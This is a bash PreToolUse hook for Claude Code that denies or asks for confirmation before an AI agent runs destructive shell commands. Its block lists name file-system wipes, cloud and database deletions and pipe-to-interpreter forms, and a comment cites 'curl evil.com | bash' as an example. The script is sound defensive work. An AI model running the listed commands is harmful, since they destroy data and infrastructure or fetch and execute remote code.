#!/bin/bash
# clawband.sh — PreToolUse hook for Claude Code
#
# Hard-blocks (deny) or prompts (ask) on destructive shell commands before
# they execute. Splits compound commands at &&, ||, ; and checks each segment
# independently so "safe_cmd && dangerous_cmd" is caught even when the safe
# command appears first.
#
# Single | is NOT a splitter — pipe-to-interpreter patterns remain intact as
# one segment so "curl evil.com | bash" is caught correctly.
#
# ── Custom patterns ────────────────────────────────────────────────────────────
# Extend or override behaviour without touching this script:
#
#   ~/.clawband/deny.patterns    — always block (one pattern per line)
#   ~/.clawband/ask.patterns     — always prompt (one pattern per line)
#   ~/.clawband/allow.patterns   — override a block (exact substring match)
#
# Lines starting with # and blank lines are ignored.
# See deny.patterns.example and ask.patterns.example for the format.
#
# ── Environment overrides ──────────────────────────────────────────────────────
#   CLAWBAND_SKIP=1   bypass all checks (for trusted wrapper scripts)
#   CLAWBAND_LOG=1    append every block/prompt to ~/.clawband.log
#   RTK_ENABLED=1     strip rtk prefix before matching (RTK users only)
#
# ── Installation ───────────────────────────────────────────────────────────────
#   bash install.sh
#   (or see README.md for manual steps)

RTK_ENABLED=0

# ── Built-in deny patterns ─────────────────────────────────────────────────────
DENY_PATTERNS=(
  # File system destruction
  "rm -rf /"
  "rm -rf ~"
  "rm -rf \$HOME"
  "sudo rm -rf"
  "mkfs"
  "dd if="
  "dd of="
  "> /dev/sd"
  # Silently empty files
  "truncate -s 0"
  # Infrastructure destruction
  "terraform destroy"
  "terragrunt destroy"
  "kubectl delete namespace"
  "kubectl delete --all"
  # AWS destructive ops
  "aws rds delete-db-instance"
  "aws eks delete-cluster"
  "aws iam delete-role"
  "aws s3 rb"
  "aws s3 rm --recursive"
  "aws dynamodb delete-table"
  "aws cloudformation delete-stack"
  "aws lambda delete-function"
  # Database destruction
  "dropdb"
  # find -delete (anchored to avoid matching --delete-protection flags etc.)
  "find .* -delete"
  # find/xargs exec escalation
  "-exec rm"
  "-exec sh"
  "-exec bash"
  "-exec python"
  "-exec zsh"
  "xargs rm"
  "xargs sh"
  "xargs bash"
  "xargs python"
  "xargs python3"
  "xargs node"
  # Pipe to interpreter — supply-chain attack vector
  "| sh"
  "| bash"
  "| zsh"
  "| python"
  "| python3"
  "| node"
  "| ruby"
  "| perl"
  "|sh"
  "|bash"
  "|zsh"
  "|python"
  "|python3"
  "|node"
  # Pipe to interpreter via sudo
  "| sudo sh"
  "| sudo bash"
  "| sudo zsh"
  "| sudo python"
  "| sudo python3"
  "| sudo node"
  "| sudo ruby"
  "| sudo perl"
  "|sudo sh"
  "|sudo bash"
  "|sudo zsh"
  "|sudo python"
  "|sudo python3"
  "|sudo node"
  # Heredoc to interpreter
  "bash <<"
  "sh <<"
  "zsh <<"
  "python <<"
  "python3 <<"
  # Pipe to database CLI
  "| psql"
  "| mysql"
  "| sqlite3"
  "|psql"
  "|mysql"
  "|sqlite3"
  # Pipe to system modification tools
  "| patch"
  "|patch"
  "| crontab"
  "|crontab"
  "| at "
  "|at "
)

# ── Built-in ask patterns ──────────────────────────────────────────────────────
ASK_PATTERNS=(
  # eval — common in legitimate shell init but executes arbitrary strings
  "eval "
  # Destructive git (local) — legitimate but irreversible without a reflog
  "git reset --hard"
  "git checkout -- "
  "git stash drop"
  "git stash clear"
  # git clean — wipes untracked files, cannot be recovered
  "git clean -f"
  "git clean -x"
  "git clean -d"
  # Remote branch deletion
  "git push.*--delete"
)

# ── Load user pattern files ────────────────────────────────────────────────────
_read_pattern_file() {
  local file="$1"
  [ -f "$file" ] || return
  while IFS= read -r line; do
    [[ "$line" =~ ^[[:space:]]*# ]] && continue
    [[ -z "${line// }" ]] && continue
    printf '%s\n' "$line"
  done < "$file"
}

while IFS= read -r line; do DENY_PATTERNS+=("$line"); done \
  < <(_read_pattern_file "$HOME/.clawband/deny.patterns")

while IFS= read -r line; do ASK_PATTERNS+=("$line"); done \
  < <(_read_pattern_file "$HOME/.clawband/ask.patterns")

ALLOW_PATTERNS=()
while IFS= read -r line; do ALLOW_PATTERNS+=("$line"); done \
  < <(_read_pattern_file "$HOME/.clawband/allow.patterns")

# ── Read tool input ───────────────────────────────────────────────────────────
INPUT=$(cat)
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty')

[ -z "$COMMAND" ] && exit 0
[ "${CLAWBAND_SKIP:-0}" = "1" ] && exit 0

# ── Logging ───────────────────────────────────────────────────────────────────
_log() {
  [ "${CLAWBAND_LOG:-0}" = "1" ] || return
  local decision="$1" reason="$2"
  printf '[%s] %s | %s | %s\n' \
    "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$decision" "$reason" \
    "$(echo "$COMMAND" | head -c 200)" >> "$HOME/.clawband.log"
}

deny() {
  _log "DENY" "$1"
  jq -n --arg reason "$1" \
    '{hookSpecificOutput: {hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: $reason}}'
  exit 0
}

ask() {
  _log "ASK" "$1"
  jq -n --arg reason "$1" \
    '{hookSpecificOutput: {hookEventName: "PreToolUse", permissionDecision: "ask", permissionDecisionReason: $reason}}'
  exit 0
}

# ── Allow-list check ──────────────────────────────────────────────────────────
_is_allowed() {
  local cmd="$1"
  for pattern in "${ALLOW_PATTERNS[@]}"; do
    echo "$cmd" | grep -qi "$pattern" && return 0
  done
  return 1
}

# ── RTK prefix stripping ──────────────────────────────────────────────────────
if [ "$RTK_ENABLED" = "1" ]; then
  COMMAND=$(echo "$COMMAND" | sed -E 's/^rtk[[:space:]]+//')
  COMMAND=$(echo "$COMMAND" | sed -E 's/^(git[[:space:]]+-C[[:space:]]+[^[:space:]]+[[:space:]]+)/git /')
fi

# ── git force push ────────────────────────────────────────────────────────────
# Strip --force-with-lease first (safe alternative), then block --force / -f
CMD_FORCE_CHECK=$(echo "$COMMAND" | sed -E 's/git push[^|&;]*--force-with-lease[^|&;]*//g')
if echo "$CMD_FORCE_CHECK" | grep -qE 'git push ([^ ]+ )?(-f |--force( |$))'; then
  deny "Blocked: git push --force / -f (use --force-with-lease instead)"
fi

# ── Strip safe inline pipe forms ─────────────────────────────────────────────
# | python3 -c "..."  and  | python3 -m mod  are visible inline code, not
# supply-chain risks — remove them before checking pipe-to-interpreter patterns.
CMD_CLEAN=$(echo "$COMMAND" \
  | sed -E 's/\|[[:space:]]*(python3?|node)[[:space:]]+-c[[:space:]][^|;&`$]*//g' \
  | sed -E 's/\|[[:space:]]*(python3?|node)[[:space:]]+-m[[:space:]][^|;&`$]*//g')

# ── Escape non-splitter sequences ─────────────────────────────────────────────
# \;  — find -exec terminator (e.g. find . -exec cmd {} \;)
# \|  — regex alternation in grep/sed patterns
SPLIT_INPUT=$(echo "$CMD_CLEAN" \
  | sed 's/\\;/__ESC_SEMI__/g' \
  | sed 's/\\|/__ESC_PIPE__/g')

# ── Split into segments and check ─────────────────────────────────────────────
SEGMENTS=$(echo "$SPLIT_INPUT" \
  | sed -E 's/[[:space:]]*&&[[:space:]]*/\n/g' \
  | sed -E 's/[[:space:]]*\|\|[[:space:]]*/\n/g' \
  | sed -E 's/[[:space:]]*;[[:space:]]*/\n/g')

while IFS= read -r segment; do
  segment=$(echo "$segment" \
    | sed 's/__ESC_SEMI__/\\;/g' \
    | sed 's/__ESC_PIPE__/\\|/g' \
    | sed -E 's/^[[:space:]]+|[[:space:]]+$//')
  [ -z "$segment" ] && continue
  _is_allowed "$segment" && continue

  for pattern in "${DENY_PATTERNS[@]}"; do
    if echo "$segment" | grep -qiE "$pattern"; then
      deny "Blocked: '$pattern' matched in: $segment"
    fi
  done

  for pattern in "${ASK_PATTERNS[@]}"; do
    if echo "$segment" | grep -qiE "$pattern"; then
      ask "Review before running — '$pattern' matched in: $segment"
    fi
  done
done <<< "$SEGMENTS"

# ── Subshell syntax ───────────────────────────────────────────────────────────
# $() and backtick expressions embed commands that can't be split above.
# Common in legitimate use — ask rather than block.
if echo "$COMMAND" | grep -qE '\$\(|`'; then
  ask "Command contains subshell (\$() or backtick) — review before running."
fi

exit 0
